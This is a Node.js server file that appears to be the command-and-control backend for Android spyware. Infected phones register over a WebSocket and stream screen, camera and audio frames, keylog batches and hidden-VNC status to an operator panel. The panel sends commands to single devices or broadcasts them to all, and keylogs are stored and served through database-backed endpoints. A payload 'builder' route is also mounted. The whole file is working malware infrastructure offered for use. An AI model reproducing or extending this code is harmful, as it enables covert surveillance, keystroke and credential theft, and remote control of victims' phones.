'use strict';
require('dotenv').config();

const path    = require('path');
const express = require('express');
const http    = require('http');
const WebSocket = require('ws');
const cors    = require('cors');
const jwt     = require('jsonwebtoken');
const { v4: uuidv4 } = require('uuid');
const db      = require('./db/database');
const authRoutes    = require('./routes/auth');
const builderRoutes = require('./routes/builder');
const { authMiddleware } = require('./middleware/auth');

// ── Config ─────────────────────────────────────────────────────────────────────

const PORT          = parseInt(process.env.PORT || '3000', 10);
const DEVICE_SECRET = process.env.DEVICE_SECRET || '';
const JWT_SECRET    = process.env.JWT_SECRET    || 'changeme';
const FRONTEND_DIST = path.join(__dirname, '..', 'frontend', 'dist');

// Connection health tuning
const PING_INTERVAL_MS  = 18_000;   // How often to send protocol pings
const PONG_TIMEOUT_MS   = 60_000;   // How long before a non-responsive socket is reaped
const AUTH_TIMEOUT_MS   = 15_000;   // How long a device has to register before close
const DEVICE_IDLE_REAP  = 90_000;   // Reap device if no message for 90s (ping counts)

// Frame forwarding
const FRAME_TYPE_SCREEN = 0x01;
const FRAME_TYPE_CAMERA = 0x02;
const FRAME_TYPE_AUDIO  = 0x03;

// ── Express ────────────────────────────────────────────────────────────────────

const app = express();
app.use(cors({ origin: '*', credentials: true }));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: false }));

const server = http.createServer(app);

// ── WebSocket servers ──────────────────────────────────────────────────────────
// /ws    → Android devices
// /panel → Operator panel (browser)

const deviceWss = new WebSocket.Server({ noServer: true, maxPayload: 64 * 1024 * 1024 });
const panelWss  = new WebSocket.Server({ noServer: true, maxPayload:  4 * 1024 * 1024 });

// Registry
// deviceId → { ws, ip, info, connectedAt, lastMsg, pingTs, pongTs, missedPings }
const devices = new Map();

// panel ws → { authed, lastMsg, pingTs, pongTs, missedPings }
const panels  = new Map();

// ── HTTP upgrade routing ────────────────────────────────────────────────────────

server.on('upgrade', (req, socket, head) => {
  const url = new URL(req.url, 'http://x');
  const p   = url.pathname;

  if (p === '/ws') {
    deviceWss.handleUpgrade(req, socket, head, ws =>
      deviceWss.emit('connection', ws, req));
  } else if (p === '/panel') {
    panelWss.handleUpgrade(req, socket, head, ws =>
      panelWss.emit('connection', ws, req));
  } else {
    socket.write('HTTP/1.1 404 Not Found\r\nConnection: close\r\n\r\n');
    socket.destroy();
  }
});

// ── Broadcast helpers ──────────────────────────────────────────────────────────

function toAllPanels(obj) {
  const s = JSON.stringify(obj);
  for (const [ws, meta] of panels) {
    if (meta.authed && ws.readyState === WebSocket.OPEN) {
      try { ws.send(s); } catch {}
    }
  }
}

function toAllPanelsBinary(buf) {
  for (const [ws, meta] of panels) {
    if (meta.authed && ws.readyState === WebSocket.OPEN) {
      try { ws.send(buf); } catch {}
    }
  }
}

function toDevice(deviceId, obj) {
  const entry = devices.get(deviceId);
  if (!entry) return false;
  if (entry.ws.readyState !== WebSocket.OPEN) return false;
  try {
    entry.ws.send(JSON.stringify(obj));
    return true;
  } catch {
    return false;
  }
}

// ── Keepalive engine ────────────────────────────────────────────────────────────

function startKeepalive() {
  setInterval(() => {
    const now = Date.now();

    // Ping devices
    for (const [id, entry] of devices) {
      if (entry.ws.readyState !== WebSocket.OPEN) { devices.delete(id); continue; }

      const timeSinceMsg = now - entry.lastMsg;

      // Reap if completely silent
      if (timeSinceMsg > DEVICE_IDLE_REAP && entry.missedPings >= 3) {
        console.log(`[DEVICE] Reaping dead device ${id} (${entry.missedPings} missed pings)`);
        entry.ws.terminate();
        devices.delete(id);
        toAllPanels({ type: 'device_offline', deviceId: id });
        continue;
      }

      // Ping
      try {
        entry.ws.ping();
        entry.missedPings++;
        entry.pingTs = now;
      } catch {
        entry.ws.terminate();
        devices.delete(id);
      }
    }

    // Ping panels
    for (const [ws, meta] of panels) {
      if (ws.readyState !== WebSocket.OPEN) { panels.delete(ws); continue; }

      if (meta.missedPings >= 3 && now - meta.pingTs > PONG_TIMEOUT_MS) {
        ws.terminate();
        panels.delete(ws);
        continue;
      }

      try {
        ws.ping();
        meta.missedPings++;
        meta.pingTs = now;
      } catch {
        ws.terminate();
        panels.delete(ws);
      }
    }
  }, PING_INTERVAL_MS).unref();
}

// Pong handlers
deviceWss.on('pong', ws => {
  for (const entry of devices.values()) {
    if (entry.ws === ws) {
      entry.missedPings = 0;
      entry.pongTs = Date.now();
      entry.lastMsg = Date.now();
      break;
    }
  }
});

panelWss.on('pong', ws => {
  const meta = panels.get(ws);
  if (meta) {
    meta.missedPings = 0;
    meta.pongTs = Date.now();
    meta.lastMsg = Date.now();
  }
});

startKeepalive();

// ── /ws — Device namespace ──────────────────────────────────────────────────────

deviceWss.on('connection', (ws, req) => {
  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
           || req.socket?.remoteAddress || 'unknown';

  const url      = new URL(req.url, 'http://x');
  const deviceId = url.searchParams.get('device_id') || null;

  let registered = false;

  const authTimer = setTimeout(() => {
    if (!registered) {
      console.log(`[DEVICE] Auth timeout, closing ${ip}`);
      ws.close(4001, 'no_registration');
    }
  }, AUTH_TIMEOUT_MS);

  // ── Message handler ───────────────────────────────────────────────────────

  ws.on('message', async (data, isBinary) => {
    if (!deviceId) return;

    // Update last-message timestamp
    const entry = devices.get(deviceId);
    if (entry) { entry.lastMsg = Date.now(); entry.missedPings = 0; }

    // ── Binary frame forwarding ─────────────────────────────────────────────
    if (isBinary) {
      const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
      if (buf.length < 5) return;

      const frameType = buf[0];
      const size      = buf.readUInt32BE(1);
      const payload   = buf.slice(5, 5 + size);

      if (frameType !== FRAME_TYPE_SCREEN &&
          frameType !== FRAME_TYPE_CAMERA &&
          frameType !== FRAME_TYPE_AUDIO) return;

      // Build forwarded frame: [frameType:1][devIdLen:2][devId:UTF8][payload]
      const devIdBuf = Buffer.from(deviceId, 'utf8');
      const hdr      = Buffer.allocUnsafe(3);
      hdr[0]         = frameType;
      hdr.writeUInt16BE(devIdBuf.length, 1);
      toAllPanelsBinary(Buffer.concat([hdr, devIdBuf, payload]));

      // Throttle last_seen DB writes
      if (!ws._lsUpdate || Date.now() - ws._lsUpdate > 10_000) {
        ws._lsUpdate = Date.now();
        db.query('UPDATE devices SET last_seen=NOW() WHERE id=$1', [deviceId]).catch(() => {});
      }
      return;
    }

    // ── JSON messages ───────────────────────────────────────────────────────

    let msg;
    try { msg = JSON.parse(data.toString()); }
    catch { return; }

    const t = msg.type || msg.cmd || '';

    switch (t) {
      // Device registration
      case 'DEVICE_INFO': {
        if (registered) break;

        // Verify secret if configured
        if (DEVICE_SECRET && msg.secret !== DEVICE_SECRET) {
          ws.close(4003, 'bad_secret');
          clearTimeout(authTimer);
          return;
        }

        registered = true;
        clearTimeout(authTimer);

        const info = msg.info || msg;
        const now  = new Date();

        devices.set(deviceId, {
          ws, ip, info,
          connectedAt: now,
          lastMsg:     Date.now(),
          pingTs:      Date.now(),
          pongTs:      Date.now(),
          missedPings: 0,
        });

        // Upsert device record
        await db.query(`
          INSERT INTO devices (id, ip, manufacturer, model, android_version, alias, online, first_seen, last_seen)
          VALUES ($1,$2,$3,$4,$5,$6,true,$7,$7)
          ON CONFLICT (id) DO UPDATE SET
            ip=$2, manufacturer=$3, model=$4, android_version=$5,
            online=true, last_seen=$7
        `, [
          deviceId,
          ip,
          info.manufacturer || '',
          info.model        || '',
          info.android_version || '',
          info.alias || null,
          now,
        ]).catch(e => console.error('[DB] upsert error:', e));

        // Save raw info blob
        await db.query(
          'INSERT INTO device_info (device_id, info, captured_at) VALUES ($1,$2,$3)',
          [deviceId, JSON.stringify(info), now]
        ).catch(() => {});

        // Notify all panels
        toAllPanels({
          type:      'device_online',
          deviceId,
          ip,
          info,
          battery_level: info.battery_level ?? -1,
          permissions:   info.permissions   || {},
        });

        console.log(`[DEVICE] Registered: ${deviceId} ${info.model || ''} ${ip}`);
        break;
      }

      // Keylog batch
      case 'KEYLOG':
      case 'keylog': {
        if (!deviceId) break;
        await db.query(
          'INSERT INTO keylogs (device_id, data, captured_at) VALUES ($1,$2,$3)',
          [deviceId, JSON.stringify(msg), new Date()]
        ).catch(() => {});
        toAllPanels({ type: 'keylog', deviceId, data: msg });
        break;
      }

      // Battery update
      case 'BATTERY':
      case 'battery_update': {
        const lvl = msg.level ?? msg.battery_level ?? -1;
        if (entry) entry.info = { ...(entry.info || {}), battery_level: lvl };
        toAllPanels({ type: 'battery_update', deviceId, level: lvl });
        break;
      }

      // Permission update
      case 'PERMISSIONS':
      case 'permission_update': {
        toAllPanels({ type: 'permission_update', deviceId, permissions: msg.permissions || {} });
        break;
      }

      // HVNC status
      case 'SILENT_VNC_STATUS':
      case 'VNC_STATUS': {
        toAllPanels({ type: 'vnc_status', deviceId, active: !!msg.active, method: msg.method || 'silent' });
        break;
      }

      // Accessibility status
      case 'ACCESSIBILITY_STATUS': {
        toAllPanels({ type: 'accessibility_status', deviceId, active: !!msg.active });
        break;
      }

      // Command response passthrough
      default: {
        // Everything else forwarded to all panels with device context
        toAllPanels({ ...msg, _from: deviceId });
        break;
      }
    }
  });

  // ── Error / close ──────────────────────────────────────────────────────────

  ws.on('error', err => {
    console.error(`[DEVICE] WS error ${deviceId}:`, err.message);
  });

  ws.on('close', (code, reason) => {
    clearTimeout(authTimer);
    if (deviceId && devices.has(deviceId)) {
      devices.delete(deviceId);
      db.query('UPDATE devices SET online=false WHERE id=$1', [deviceId]).catch(() => {});
      toAllPanels({ type: 'device_offline', deviceId });
      console.log(`[DEVICE] Disconnected: ${deviceId} code=${code}`);
    }
  });
});

// ── /panel — Operator panel namespace ──────────────────────────────────────────

panelWss.on('connection', (ws, req) => {
  const meta = {
    authed:      false,
    lastMsg:     Date.now(),
    pingTs:      Date.now(),
    pongTs:      Date.now(),
    missedPings: 0,
  };
  panels.set(ws, meta);

  // Require JWT auth within 10s
  const authTimer = setTimeout(() => {
    if (!meta.authed) {
      ws.close(4001, 'no_auth');
      panels.delete(ws);
    }
  }, 10_000);

  ws.on('message', async (data, isBinary) => {
    if (isBinary) return;

    meta.lastMsg = Date.now();
    meta.missedPings = 0;

    let msg;
    try { msg = JSON.parse(data.toString()); }
    catch { return; }

    const t = msg.type || '';

    // ── Auth ────────────────────────────────────────────────────────────────

    if (t === 'auth') {
      try {
        jwt.verify(msg.token, JWT_SECRET);
        meta.authed = true;
        clearTimeout(authTimer);

        // Send current device list
        const devList = [];
        for (const [id, entry] of devices) {
          devList.push({
            id,
            ip:    entry.ip,
            info:  entry.info || {},
            online: true,
            connectedAt: entry.connectedAt,
          });
        }
        ws.send(JSON.stringify({ type: 'authenticated', devices: devList }));
      } catch {
        ws.close(4003, 'bad_token');
        panels.delete(ws);
      }
      return;
    }

    if (!meta.authed) return;

    // ── Command routing ────────────────────────────────────────────────────

    if (t === 'cmd' || t === 'command') {
      const { deviceId, cmd } = msg;
      if (!deviceId || !cmd) return;
      const sent = toDevice(deviceId, { ...cmd, _from_panel: true });
      if (!sent) {
        ws.send(JSON.stringify({
          type: 'cmd_error',
          deviceId,
          error: 'Device not connected',
          cmd: cmd.type || cmd.cmd,
        }));
      }
      return;
    }

    // Get all devices list
    if (t === 'list_devices') {
      const devList = [];
      for (const [id, entry] of devices) {
        devList.push({ id, ip: entry.ip, info: entry.info || {}, online: true });
      }
      ws.send(JSON.stringify({ type: 'device_list', devices: devList }));
      return;
    }

    // Get keylogs for device
    if (t === 'get_keylogs') {
      const { deviceId, limit = 500 } = msg;
      try {
        const rows = await db.query(
          'SELECT data, captured_at FROM keylogs WHERE device_id=$1 ORDER BY captured_at DESC LIMIT $2',
          [deviceId, limit]
        );
        ws.send(JSON.stringify({ type: 'keylogs', deviceId, rows: rows.rows }));
      } catch (e) {
        ws.send(JSON.stringify({ type: 'error', message: e.message }));
      }
      return;
    }

    // Broadcast to all devices (bulk command)
    if (t === 'broadcast_cmd') {
      const { cmd } = msg;
      if (!cmd) return;
      let sent = 0;
      for (const [id] of devices) {
        if (toDevice(id, { ...cmd, _broadcast: true })) sent++;
      }
      ws.send(JSON.stringify({ type: 'broadcast_result', sent }));
      return;
    }
  });

  ws.on('error', err => console.error('[PANEL] WS error:', err.message));

  ws.on('close', () => {
    clearTimeout(authTimer);
    panels.delete(ws);
  });
});

// ── HTTP Routes ────────────────────────────────────────────────────────────────

app.use('/api/auth', authRoutes);
app.use('/api/builder', authMiddleware, builderRoutes);

// Device list REST endpoint
app.get('/api/devices', authMiddleware, async (req, res) => {
  try {
    const rows = await db.query(
      `SELECT id, ip, manufacturer, model, android_version, alias,
              online, first_seen, last_seen
       FROM devices ORDER BY last_seen DESC LIMIT 500`
    );
    // Merge with live WS data
    const live = new Set([...devices.keys()]);
    const result = rows.rows.map(r => ({
      ...r,
      online: live.has(r.id),
      info: devices.get(r.id)?.info || {},
    }));
    res.json(result);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Device keylogs REST
app.get('/api/devices/:id/keylogs', authMiddleware, async (req, res) => {
  const { id } = req.params;
  const limit  = parseInt(req.query.limit || '1000', 10);
  try {
    const rows = await db.query(
      'SELECT data, captured_at FROM keylogs WHERE device_id=$1 ORDER BY captured_at DESC LIMIT $2',
      [id, limit]
    );
    res.json(rows.rows);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Send command via REST (useful for scripting)
app.post('/api/devices/:id/cmd', authMiddleware, (req, res) => {
  const { id } = req.params;
  const cmd = req.body;
  if (!cmd || !cmd.type) return res.status(400).json({ error: 'cmd.type required' });
  const sent = toDevice(id, cmd);
  if (!sent) return res.status(404).json({ error: 'Device not connected' });
  res.json({ ok: true });
});

// Static frontend
app.use(express.static(FRONTEND_DIST));
app.get('*', (_, res) => res.sendFile(path.join(FRONTEND_DIST, 'index.html')));

// Health check
app.get('/health', (_, res) => res.json({
  ok: true,
  devices: devices.size,
  panels: panels.size,
  uptime: process.uptime(),
}));

// ── Boot ────────────────────────────────────────────────────────────────────────

server.listen(PORT, '0.0.0.0', () => {
  console.log(`[SERVER] Listening on :${PORT}`);
  console.log(`[SERVER] Devices: ws://0.0.0.0:${PORT}/ws`);
  console.log(`[SERVER] Panel:   ws://0.0.0.0:${PORT}/panel`);
});

server.on('error', err => {
  console.error('[SERVER] Fatal:', err);
  process.exit(1);
});

process.on('uncaughtException', err => {
  console.error('[UNCAUGHT]', err);
});

process.on('unhandledRejection', (reason) => {
  console.error('[UNHANDLED]', reason);
});
